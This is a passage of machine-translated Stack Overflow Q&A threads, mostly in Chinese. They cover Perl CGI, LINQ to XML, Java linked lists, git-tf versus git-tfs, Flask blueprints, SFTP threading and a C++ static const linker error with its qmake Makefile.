print "Content-type: text/html\n\n";

@names = param;
print "@names";

if(defined(param('submit'))){
        #delete_all();
        system('perl testParams.pl abc=123');
        exit(0);
} else{
        print "NO SUBMIT PARAM";
} 
```

这个脚本应该做什么：

1.  打印所有参数的名称。
2.  如果定义了提交参数，请再次运行脚本，但使用名为“abc”的参数。
3.  如果未定义“提交”参数，则打印“NO SUBMIT PARAM”。

脚本的实际作用：

1.  打印所有参数的名称。
2.  如果定义了“提交”参数，请使用与运行原始脚本相同的参数再次运行脚本。
3.  如果未定义“提交”参数，则打印“NO SUBMIT PARAM”。

知道是什么导致 Perl/CGI 在运行脚本时忽略新参数而是发送旧参数吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:51:17.740

[CGI](http://search.cpan.org/perldoc?CGI)仅在未找到 CGI 环境时处理命令行参数。CGI 环境是从父进程继承的。你可以用

```
my %CGI_VARS = map { $_ => 1 } qw(
   REQUEST_METHOD
   CONTENT_LENGTH
   CONTENT_TYPE
   ...
);

local %ENV =
    map { $_ => $ENV{$_} }
     grep !$CGI_VARS{$_} && !/^HTTP/,
      keys(%ENV); 
```

但这充满了糟糕的设计。确实，您的两个脚本应该是通用模块的薄前端。

您甚至可以对两者使用相同的脚本（通过使用符号链接），但根据用于调用脚本的 URL 更改行为。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-14T08:39:38.127

从[具有嵌套应用程序的 CGI 中，每个调用 param() 来获取它们的参数](http://perlmonks.com/?node_id=998561)，简单的答案是[从 @ARGV 创建新的 CGI 对象](http://search.cpan.org/perldoc/CGI#CREATING_A_NEW_QUERY_OBJECT_%28OBJECT-ORIENTED_STYLE%29%3a)

```
#!/usr/bin/perl  --
use strict;
use warnings;

use CGI ();

Main( @ARGV );
exit( 0 );

sub Main {
    my $cgi = @_ ? CGI->new(@_) : CGI->new;
} 
```

# xml - XML 与 Linq 与 where

> ID：12866827
> 
> 赞同：0
> 
> 时间：2012-10-12T20:43:52.987
> 
> 标签：xml, linq, subquery

我需要找到具有属性 nodeName="Industries" 的 SectionIndex，然后获取该 SectionIndex 中每个 Textpage 元素的属性（id 和 nodeName）

```
 <SectionIndex nodeName="Industries">
       <Textpage id="1" nodeName="Aerospace"</Textpage>
       <Textpage id="2" nodeName="Construction"</Textpage>
       <Textpage id="3" nodeName="Engineering"</Textpage>
    </SectionIndex>
    <SectionIndex nodeName="Greetings">
       <Textpage id="1" nodeName="Hello"</Textpage>
       <Textpage id="2" nodeName="GoodBye"</Textpage>
       <Textpage id="3" nodeName="Later"</Textpage>
    </SectionIndex> 
```

我的查询看起来像

```
 var queryServices = from s in xmldoc.Root.Descendants("SectionIndex")
                            where s.Attribute("nodeName").Value == "Industries"                                    
                            select new
                            {
                                ServicesKey = s.Element("umbTextpage").Attribute("id").Value ?? "",
                                NodeName = s.Element("umbTextpage").Attribute("nodeName").Value ?? ""
                            }; 
```

它只返回航空航天。任何提示都会很棒。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T22:04:21.023

你的问题是你在`s`价值观中循环，每一个都是 a `SectionIndex`，但你对孩子们更感兴趣。

您可以从孩子的角度重写它：

```
var queryServices =
    from s in xmldoc.Root.Descendants("Textpage")
    where s.Parent.Attribute("nodeName").Value == "Industries"
    select new
        {
            ServicesKey = s.Attribute("id").Value ?? "",
            NodeName = s.Attribute("nodeName").Value ?? ""
        }; 
```

或者，您可以将其拆分为两个查询：一个获取`SectionIndex`您感兴趣的查询，然后对其进行第二个查询以提取其子项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-15T15:51:11.773

感谢帮助。显然我错过了我试图解析的 5000 行配置文件中的一条所需信息。

```
 <root id="-1">
    <SectionIndex id="0" nodeName="Greetings">
         <Textpage id="1" nodeName="Hello"></Textpage>
         <Textpage id="2" nodeName="GoodBye"></Textpage>
         <Textpage id="3" nodeName="Later"></Textpage>
    </SectionIndex>
    <Textpage id="4" nodeName="Services">
        <SectionIndex nodeName="Industries">
             <Textpage id="5" nodeName="Aerospace"></Textpage>
             <Textpage id="6" nodeName="Construction"></Textpage>
             <Textpage id="7" nodeName="Engineering"></Textpage>
        </SectionIndex>
    </Textpage>
    </root> 
```

因此，当我尝试运行建议的查询时，它在 where 部分 do to root 没有 nodeName 时返回空异常错误。关于如何使用属性 nodeName="Industries" 查找 SectionIndex 的任何想法，然后获取该 SectionIndex 中每个 Textpage 元素的属性（id 和 nodeName）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-15T16:04:32.213

```
 var result = xDoc.Descendants("SectionIndex")
            .Where(e => e.Attribute("nodeName").Value == "Industries")
            .SelectMany(e => e.Descendants()
                                 .Select(x => new
                                     {
                                         ServicesKey = x.Attribute("id").Value,
                                         NodeName = x.Attribute("nodeName").Value
                                     })); 
```

# java - 将字典实现为排序的单链表Java

> ID：12866829
> 
> 赞同：0
> 
> 时间：2012-10-12T20:43:54.717
> 
> 标签：java, dictionary, file-io, text-files

我必须创建一个字典，在其中输入一个包含 5 个句子的文本文件，它会使用其中的单词并使用单链表按字母顺序对它们进行排序。我有文本文件，但确实需要帮助将它们制作成链接列表并对其进行排序。我了解如何创建链接列表，但我不知道如何从文本文件创建它们并对其进行排序。任何帮助，将不胜感激。

```
import java.util.*;

public class Dictionary {

  public static void main(String[] args) {
    String[] things = {"a", "dog", "eats"};
    List<String> list1 = new LinkedList<String>();
    for(String x : things)
      list1.add(x);

    String[] things2 = {"The", "Cat", "Walks"};
    List<String> list2 = new LinkedList<String>();
    for(String y : things2)
      list2.add(y);

    list1.addAll(list2);
    list2 = null;

    printMe(list1);
    printMe(list1);
  }

  private static void printMe(List<String> l) {
    for(String b : l)
      System.out.printf("%s ", b);
    System.out.println();
  }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T20:59:54.023

尝试使用[扫描仪](http://docs.oracle.com/javase/1.5.0/docs/api/java/util/Scanner.html)读取输入文件

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-13T01:57:26.270

好吧， Scanner 类具有根据您提供的模式迭代令牌的方法。您可以在每次调用“hasNext(Pattern)”和“next(Pattern)”时提供模式（正则表达式），或者通过调用“usePattern(Pattern)”方法来设置默认模式，并使用标准的“ hasNext()" 和 "next()" 迭代器方法。

如果你没有设置任何模式，它会使用这个：

```
// A pattern for java whitespace
private static Pattern WHITESPACE_PATTERN = Pattern.compile(
"\\p{javaWhitespace}+"); 
```

我不会在这里讨论正则表达式，但您的一般流程是：

```
Scanner scanner = new Scanner(reader);
scanner.usePattern(Pattern.compile("some regex pattern")); // if you want something other than the default
while (scanner.hasNext()) {
    String word = scanner.next();
} 
```

可能的阅读器是 java.io.FileReader 的一个实例。如果您想为大文件提供更好的吞吐量，请将 FileReader 包装在 java.io.BufferedReader 中。

对于排序，您可以在添加所有单词后使用 Collections.sort() 进行排序，或者在添加每个单词时，您可以使用 List.listIterator() 方法返回的 ListIterator 遍历现有链表，找到第一个元素在字典上大于该标记，并使用 ListIterator.add() 方法在该标记之前插入。

# git - git-tf 和 git-tfs 有什么区别？

> ID：12866832
> 
> 赞同：79
> 
> 时间：2012-10-12T20:44:02.100
> 
> 标签：git, tfs, tfvc, git-tfs, git-tf

我最近真的厌倦了 TFS。不过我听说隧道尽头有一盏灯。显然我可以使用 git-tf 或 git-tfs 并将我的代码视为由 git 管理，但能够向/从中央 TFS 服务器推/拉。

我的主要问题是我不确定我应该使用其中哪一个。有微软官方支持的 git-tf，还有存在时间更长的 git-tfs。这些之间有什么区别，我应该先尝试哪个？

* * *

## 回答 #1

> 赞同：93
> 
> 时间：2012-10-12T21:24:11.967

免责声明：我[开始了这个`git-tf`项目](http://www.edwardthomson.com/blog/team-foundation-server-and-xcode-projects-with-git-tf)，虽然这个项目现在在没有我作为经常贡献者的情况下非常有能力，但你绝对应该认为我对此的看法是有*强烈*偏见的。（而且，假设您在 Windows 上，可能会出乎意料。）

这两种工具有两个根本区别：

*   `git-tfs`是为 Windows 用户构建的，并在 .NET TFS SDK 之上编写。TFS SDK*不会*在 Mono 下运行，因此`git-tfs`不适合跨平台使用。

*   `git-tf`是为跨平台用户构建的，并在 Java TFS SDK 之上编写。因此，它可以在任何受 Java TFS SDK（Windows、Mac、Linux、AIX、HP-UX、Solaris 等）支持的地方运行，该 SDK `git-tf`被明确创建以允许 Xcode 用户访问 TFS。

当然，在 Windows 上，您可以使用其中任何一个。我不一定会说一个比另一个更好。但我会说：

1.  *我*最大的抱怨`git-tfs`是它无法在 Mac OS 上运行。如果有办法使`git-tfs`跨平台，那么`git-tf`几乎肯定不会存在。

2.  `git-tfs`在某些情况下比*快*`git-tf`。在最初的几次修订中，性能*不是*我们的首要任务，正确性才是。

3.  因为`git-tf`具有广泛的平台支持矩阵，这意味着它的功能必然受到限制。例如，*没有*UI。 `git-tfs`另一方面，有一个`checkintool`命令将打开正常的 TFS Checkin 对话框。这对于可视化您的更改非常有帮助。（如果我记得，你可以从那里打开一个适当的视觉差异，等等）

4.  `git-tf`通过直接填充 git 存储库，将 TFS 对象直接下载到 git 对象数据库来工作。 `git-tfs`通过在隐藏文件夹中创建 TFS 工作文件夹映射，然后从中填充 git 存储库来工作。这里有一个磁盘损失，所以如果你有超大的存储库，你可能会感觉到这一点。

5.  `git-tfs`可以尝试将您的 TFS 分支映射到您的 git 分支。很多人会认为这是对`git-tfs`.最简单的工作流程。但是您的里程可能会有所不同。

6.  `git-tfs`由社区积极开发。 `git-tf`没有被社区收养。

我不想让它听起来像我在说`git-tf`不好。它不是。我觉得其实挺好的。但这可能不是您的最佳选择。

* * *

更新：[`git-tf`已达到生命周期结束](http://gittf.codeplex.com/)。Microsoft 不再维护或支持它。`git-tfs`如果您想要双向 TFS <-> git 解决方案，我们建议您使用。

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2012-12-05T13:12:46.477

Disclaimer: I am a developper on the git-tfs project

Edit: activity around git-tfs [is reduced](https://github.com/git-tfs/git-tfs).

There is a support of TFS branching in git-tfs (fetching existing branches, creating branches, merge branches more easily than with TFS,... using `branch` command). It works most of the time but not with complex TFVC branches workflow...

See:

*   [Managing branches with git-tfs](https://github.com/git-tfs/git-tfs/blob/master/doc/usecases/manage_tfs_branches.md)
*   [git-tfs branch command documentation](https://github.com/git-tfs/git-tfs/blob/master/doc/commands/branch.md)
*   [Another answer on stackoverflow on the subject](https://stackoverflow.com/a/13710811/717372)

git-tfs is also perhaps the only tool that permit you to migrate from TFS(VC) to TFS(Git), managing workitems if needed, or plain git repository.

And some other good features...

~~(And it is more [active](https://github.com/git-tfs/git-tfs/graphs/contributors) and more [supported](https://github.com/git-tfs/git-tfs/issues))~~

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2015-09-21T17:13:11.797

对于任何找到此线程的人：

`Git-TF`在 2013 年后未更新后已正式停产，现在明确建议`Git-TFS`作为替代方案。

> # Git-TF 生命周期结束
> 
> Git-TF 已经到了生命的尽头。它将没有进一步的更新，并且不再受 Microsoft 支持。
> 
> Microsoft Visual Studio Team Services 现在提供了一个简单的导入工具，用于将 Team Foundation 版本控制存储库导入 Git 存储库。我们建议您使用它来将 TFVC 存储库转换为 Git。
> 
> 如果您需要更高级的转换需求，或者您想桥接 TFVC 存储库并使用本地 Git 存储库，**我们建议使用 git-tfs 项目**。
> 
> Git-TF 不应该用于新项目，但它将保留在 Codeplex 存档中供旧用户使用。

*（部分由 Edward Thomson 于 2017 年 4 月[添加](https://gittf.codeplex.com/wikipage/history)到项目的[codeplex 页面](https://gittf.codeplex.com/)，其发起者和已接受答案的作者）*

`Git-TFS`似乎正在积极维护： [https ://github.com/git-tfs/git-tfs/commits/master](https://github.com/git-tfs/git-tfs/commits/master)

# python - 带有 Flask 和 MongoEngine 示例的 Tumblelog 应用程序不起作用 - 完成新手

> ID：12866833
> 
> 赞同：3
> 
> 时间：2012-10-12T20:44:04.033
> 
> 标签：python, mongodb, flask

MongoDB 站点上的[Tumblelog 应用程序](http://docs.mongodb.org/manual/tutorial/write-a-tumblelog-application-with-flask-mongoengine/#django)不起作用。

我完全遵循了这个例子，当我在本地主机上运行它时出现 404 错误。我在 Ubuntu 12.0.4 上使用 Eclipse Indigo (3.7.2) 和 pyDev。

我不确定是不是因为`register_blueprints`我包含在`__init__.py`

我在教程中这样做了：

```
from flask import Flask
from flask.ext.mongoengine import MongoEngine

app = Flask(__name__)
app.config["MONGODB_DB"] = "my_tumble_log"
app.config["SECRET_KEY"] = "KeepThisS3cr3t"

db = MongoEngine(app)

if __name__ == '__main__':
    app.run()

    def register_blueprints(app):
    # Prevents circular imports
        from tumblelog.views import posts
        app.register_blueprint(posts)
    register_blueprints(app) 
```

否则，我完全按照教程进行操作。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T21:26:50.797

`register_blueprints`永远不会被调用 -`app.run`阻塞直到你终止脚本（此时没有必要添加路由）。

更改顺序，一切都会运行：

```
def register_blueprints(app):
# Prevents circular imports
    from tumblelog.views import posts
    app.register_blueprint(posts)

register_blueprints(app)

if __name__ == '__main__':
    app.run() 
```

`regist_blueprints`实际上并没有阻止循环导入 - 避免循环导入的模式是`app`在不同的文件中创建并将两者都`app`导入`blueprint`第三个文件以运行所有内容：

```
#  application.py
from flask import Flask  # etc.

app = Flask("your_package_name") 
```

```
# tumblelog/views.py
from flask import Blueprint, current_app  # etc.

posts = Blueprint("tumblelog")

@posts.route("/")
def index():
    # use current_app rather than app here 
```

```
# run_server.py (use the same pattern for .wsgi files)
from application import app
from tumblelog.views import posts

app.register_blueprint(posts)

if __name__ == "__main__":
    app.run() 
```

# javascript - Chrome 扩展：将 postMessage 从 iframe 发送到父窗口

> ID：12866834
> 
> 赞同：6
> 
> 时间：2012-10-12T20:44:04.717
> 
> 标签：javascript, google-chrome-extension

我正在开发我在其中创建 iframe 的 Chrome 扩展程序。我正在尝试发送消息`postMessage`并收到有关协议不匹配的消息，如下所示：

> 不安全的 JavaScript 尝试从带有 URL chrome-extension://gbafofmepfbgfgglhfaddmfnmdcddiig/js/content_script/file.html 的框架访问带有 URL https://* 的框架。请求访问的框架具有“chrome-extension”协议，被访问的框架具有“https”协议。协议必须匹配。

# java - 多个线程从 sftp 服务器下载相同的文件

> ID：12866838
> 
> 赞同：0
> 
> 时间：2012-10-12T20:44:22.613
> 
> 标签：java, multithreading, sftp

我有一个系统，当找到某种类型的文件时，我会在单独的线程中下载、编码和上传它们。

```
while(true) {
    for(SftpClient c : clients) {
        try {
            filenames = c.list("*.wav", "_rdy_");
        } catch (SftpException e) {
            e.printStackTrace();
        }
        if(filenames.size() > 0) {
            //AudioThread run() method handles the download, encode, and upload
            AudioThread at = new AudioThread(filenames);
            at.setNode(c.getNode());
            Thread t = new Thread(at);
            t.start();
        }
    }
    try {
        Thread.sleep(3000);
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
} 
```

AudioThread 的 run 方法

```
public void run() {
    System.out.println("Running...");
    this.buildAsteriskMapping();
    this.connectToSFTP();
    ac = new AudioConvert();
    this.connectToS3();

    String downloadDir = "_rough/" + getNode() + "/" + Time.getYYYYMMDDDate() + "/";
    String encodeDir = "_completed" + getNode() + "/" + Time.getYYYYMMDDDate() + "/";
    String uploadDir = getNode() + "/" + Time.getYYYYMMDDDate() + "/";

    System.out.println("Downloading...");
    try {
        sftp.get(filenames, downloadDir);
    } catch (SftpException e) {
        //download failed
        System.out.println("DL Failed...");
        e.printStackTrace();
    }

    System.out.println("Encoding...");
    try {
        ac.encodeWavToMP3(filenames, downloadDir, encodeDir);
    } catch (IllegalArgumentException | EncoderException e) {
        System.out.println("En Failed...");
        e.printStackTrace();
    }

    System.out.println("Uploading...");
    try {
        s3.upload(filenames, encodeDir, uploadDir);
    } catch (AmazonClientException e) {
        System.out.println("Up Failed...");
        e.printStackTrace();
    }

} 
```

下载方式：

```
public void get(ArrayList<String> src, String dest) throws SftpException {
    for(String file : src) {
        System.out.println(dest + file);
        channel.get(file, dest + file);
    }
} 
```

编码方法：

```
public void encodeWavToMP3(ArrayList<String> filenames, String downloadDir, String encodeDir) throws IllegalArgumentException, EncoderException {
    for(String f : filenames) {
        File wav = new File(downloadDir + f);
        File mp3 = new File(encodeDir + wav.getName().replace(".wav", ".mp3"));
        encoder.encode(wav, mp3, attrs);
    }
} 
```

上传方式：

```
public void upload(ArrayList<String> filenames, String encodeDir, String uploadDir)  throws AmazonClientException, AmazonServiceException {
    for(String f : filenames) {
        s3.putObject(new PutObjectRequest(bucketName, uploadDir, new File(encodeDir + f)));
    }
} 
```

问题是我不断为每个线程下载相同的文件（或大约相同的文件）。我想为每个保存正在下载的文件的客户端添加一个变量，但我不知道如何从这个变量中删除列表/文件名。什么是解决方案？我的老板也希望只允许运行 x 个线程。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-12T21:09:29.033

很难看出问题所在，因为缺少实际下载的代码：P

但是，我会改用某种[ExecutorService](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/ExecutorService.html)。

基本上，我会将每个下载请求添加到服务中（包装在“DownloadTask”中，并引用要下载的文件以及获取文件可能需要的任何其他相关信息），然后让服务来处理其余的事情。

可以对下载任务进行编码，以根据您认为合适的方式考虑现有文件。

根据您的要求，这可能是单线程或多线程服务。它还可以让您在其中放置上传任务。

查看[Executors](http://docs.oracle.com/javase/tutorial/essential/concurrency/executors.html) trail 了解更多信息

总体思路是使用一种生产者/消费者模式。您将（至少）有一个线程来查找所有要下载的文件，并且对于每个文件，您会将其添加到执行程序服务中。下载文件后，我会将请求排队并将请求上传到同一服务中。

这样，您就避免了同步和线程管理的所有混乱：D

您可以对扫描任务使用相同的想法，对于每个客户端，您可以将任务分配给单独的服务

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-13T04:55:09.357

您的代码中存在问题，您在 while 循环中实例化 AudioThread。

请注意，在创建线程并执行 t.start() 后，所有下载、编码和上传都是异步进行的。因此，在您启动线程后，循环继续对 c.list(...) 进行另一次调用，而您创建的第一个线程仍在处理第一组文件。很可能在随后的 c.list() 调用中返回相同的文件集，因为您在调用中指定了文件模式，并且没有标记当前正在处理哪些文件的代码。

我的建议：

*   使用前一篇文章中提到的 Executors.newFixedThreadPool(int nThreads)。并将线程数指定为机器中的处理器数。在您的 while 循环之前执行此操作。
*   对于从 ftp s.list() 检索到的每个文件名，创建一个 Callable 类并调用 ExecutorService.invokeAll(Collection<Callable<T>> tasks)。您将创建的 Callable 中的代码是您的 AudioThread 代码。修改 AudioThread 代码以一次只处理一个文件（如果可能），这样您就可以为每个文件并行进行下载、上传和编码。
*   添加标记哪些文件已被处理的代码。我建议添加一个代码，将您已处理的文件重命名为不同的名称，以避免在下一次 c.list() 调用中返回。
*   在您的 while 循环块之后调用 ExecutorService.shutdown(...)

# c++ - 未定义的引用 - C++ 中的 `a = -b;` 和 `a = -1*b;` 和 `a = 0-b` 之间应该有区别吗？

> ID：12866839
> 
> 赞同：3
> 
> 时间：2012-10-12T20:44:23.250
> 
> 标签：c++, compiler-errors

也许这在某处得到了回答，而我只是不知道要搜索的单词。我试图了解我是否看到了错误或者我不理解减号运算符。头文件中的常量分配是否会导致编译器跳过“-”？

我的项目具有以下结构，包括生成的文件：

```
测试
├── 源
│ ├── TipCoordinate.cpp
│ └── TipCoordinate.hpp
└── 单元测试
    ├── main.cpp
    ├── main.o
    ├── 生成文件
    ├── TipCoordinate.o
    ├── UnitTest.pro
    └── UnitTest.pro.user

```

我在类头中定义了一个常量，如下所示：

```
class TipCoordinate{
public:
    TipCoordinate() {};
    ~TipCoordinate() {};
    void Z(const float z);
private:
    static const float sREFERENCE_SPHERE_RADIUS = 12;
}; 
```

我的类 cpp 文件中的以下代码将无法编译：

```
#include "TipCoordinate.hpp"
void TipCoordinate::Z(const float z){
    float z_origin_ = -sREFERENCE_SPHERE_RADIUS;
} 
```

我收到错误`.../model/TipCoordinate.cpp:143: error: undefined reference to 'TipCoordinate::sREFERENCE_SPHERE_RADIUS'`

但是，如果我只是将其更改如下，那么它非常高兴：

```
#include "TipCoordinate.hpp"
void TipCoordinate::Z(const float z){
    float z_origin_ = -1*sREFERENCE_SPHERE_RADIUS;
} 
```

或者，这也适用：

```
#include "TipCoordinate.hpp"
void TipCoordinate::Z(const float z){
    float z_origin_ = 0-sREFERENCE_SPHERE_RADIUS;
} 
```

我认为 Adam Rosenfield 的回答解决了我的问题，但在回应一些评论时，我已将上述摘录替换为重现问题的最小、完整示例。正如一些人猜测的那样，我正在使用 g++。版本是 g++ (Ubuntu/Linaro 4.5.2-8ubuntu4) 4.5.2，优化器似乎受到影响，因为我使用的是“Qt Creator 2.1.0，基于 Qt 4.7.2（32 位），构建于2011 年 3 月 11 日”。这是我的项目文件：

```
QT       -= gui
INCLUDEPATH += ../src
TEMPLATE = app
SOURCES += main.cpp \
    ../src/TipCoordinate.cpp
HEADERS += \
    ../src/TipCoordinate.hpp 
```

我的主文件如下，但是将项目模板更改为 lib 并删除主文件会导致问题消失。

```
int main() { return 0; } 
```

我怀疑 Qt Creator 很重要，因为除了更改模板之外，当我更改其他看似无关的因素时，问题会消失或再次出现。出于这个原因，我在下面包含了 Qt Creator 生成的 Makefile：

```
#############################################################################
# Makefile for building: UnitTest
# Generated by qmake (2.01a) (Qt 4.7.3) on: Sun Oct 14 15:05:23 2012
# Project:  UnitTest.pro
# Template: app
# Command: /usr/local/Trolltech/QtEmbedded-4.7.3/bin/qmake -spec /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qws/linux-x86-g++ CONFIG+=debug QMLJSDEBUGGER_PATH=/usr/share/qtcreator/qml/qmljsdebugger -o Makefile UnitTest.pro
#############################################################################

####### Compiler, tools and options

CC            = gcc
CXX           = g++
DEFINES       = -DQT_NETWORK_LIB -DQT_CORE_LIB -DQT_SHARED
CFLAGS        = -pipe -g -Wall -W -D_REENTRANT $(DEFINES)
CXXFLAGS      = -pipe -g -Wall -W -D_REENTRANT $(DEFINES)
INCPATH       = -I/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qws/linux-x86-g++ -I. -I/usr/local/Trolltech/QtEmbedded-4.7.3/include/QtCore -I/usr/local/Trolltech/QtEmbedded-4.7.3/include/QtNetwork -I/usr/local/Trolltech/QtEmbedded-4.7.3/include -I../src -I.
LINK          = g++
LFLAGS        = -Wl,-rpath,/usr/local/Trolltech/QtEmbedded-4.7.3/lib
LIBS          = $(SUBLIBS)  -L/usr/local/Trolltech/QtEmbedded-4.7.3/lib -lQtNetwork -L/usr/local/Trolltech/QtEmbedded-4.7.3/lib -lQtCore -lpthread 
AR            = ar cqs
RANLIB        = 
QMAKE         = /usr/local/Trolltech/QtEmbedded-4.7.3/bin/qmake
TAR           = tar -cf
COMPRESS      = gzip -9f
COPY          = cp -f
SED           = sed
COPY_FILE     = $(COPY)
COPY_DIR      = $(COPY) -r
STRIP         = strip
INSTALL_FILE  = install -m 644 -p
INSTALL_DIR   = $(COPY_DIR)
INSTALL_PROGRAM = install -m 755 -p
DEL_FILE      = rm -f
SYMLINK       = ln -f -s
DEL_DIR       = rmdir
MOVE          = mv -f
CHK_DIR_EXISTS= test -d
MKDIR         = mkdir -p

####### Output directory

OBJECTS_DIR   = ./

####### Files

SOURCES       = main.cpp \
        ../src/TipCoordinate.cpp 
OBJECTS       = main.o \
        TipCoordinate.o
DIST          = /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/g++.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/unix.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/linux.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/qws.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qconfig.pri \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/modules/qt_webkit_version.pri \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_functions.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_config.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/exclusive_builds.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_pre.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/debug.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_post.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/warn_on.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/unix/thread.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/moc.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/resources.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/uic.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/yacc.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/lex.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/include_source_dir.prf \
        UnitTest.pro
QMAKE_TARGET  = UnitTest
DESTDIR       = 
TARGET        = UnitTest

first: all
####### Implicit rules

.SUFFIXES: .o .c .cpp .cc .cxx .C

.cpp.o:
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o "$@" "$<"

.cc.o:
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o "$@" "$<"

.cxx.o:
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o "$@" "$<"

.C.o:
    $(CXX) -c $(CXXFLAGS) $(INCPATH) -o "$@" "$<"

.c.o:
    $(CC) -c $(CFLAGS) $(INCPATH) -o "$@" "$<"

####### Build rules

all: Makefile $(TARGET)

$(TARGET):  $(OBJECTS)  
    $(LINK) $(LFLAGS) -o $(TARGET) $(OBJECTS) $(OBJCOMP) $(LIBS)

Makefile: UnitTest.pro  /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qws/linux-x86-g++/qmake.conf /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/g++.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/unix.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/linux.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/qws.conf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qconfig.pri \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/modules/qt_webkit_version.pri \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_functions.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_config.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/exclusive_builds.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_pre.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/debug.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_post.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/warn_on.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/unix/thread.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/moc.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/resources.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/uic.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/yacc.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/lex.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/include_source_dir.prf \
        /usr/local/Trolltech/QtEmbedded-4.7.3/lib/libQtNetwork.prl \
        /usr/local/Trolltech/QtEmbedded-4.7.3/lib/libQtCore.prl
    $(QMAKE) -spec /usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qws/linux-x86-g++ CONFIG+=debug QMLJSDEBUGGER_PATH=/usr/share/qtcreator/qml/qmljsdebugger -o Makefile UnitTest.pro
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/g++.conf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/unix.conf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/linux.conf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/common/qws.conf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/qconfig.pri:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/modules/qt_webkit_version.pri:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_functions.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt_config.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/exclusive_builds.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_pre.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/debug.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/default_post.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/warn_on.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/qt.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/unix/thread.prf:
/usr/local/Trolltech/QtEmbedded-4.7.3/mkspecs/features/moc.prf:
